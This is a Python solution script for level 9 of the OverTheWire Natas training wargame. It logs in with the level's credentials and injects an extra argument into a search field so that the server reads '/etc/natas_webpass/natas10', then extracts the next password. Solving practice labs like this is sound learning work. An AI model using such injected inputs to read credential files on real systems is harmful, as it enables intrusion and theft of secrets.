#Import Library
import requests
import re

#Setting variables needed
username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

url = f'http://{username}.natas.labs.overthewire.org/'
#key = base64.b64decode(binascii.a2b_hex('3d3d516343746d4d6d6c315669563362')[::-1])

payloads = {'needle': '. /etc/natas_webpass/natas10','submit':'Search'}

#Connect to natas
session = requests.Session()
response = session.request('POST', url, auth=(username,password), data=payloads)

#Filtering to get a password
#result = response.text
result = re.findall('/etc/natas_webpass/natas10:(.*)', response.text)[0]

print(result)
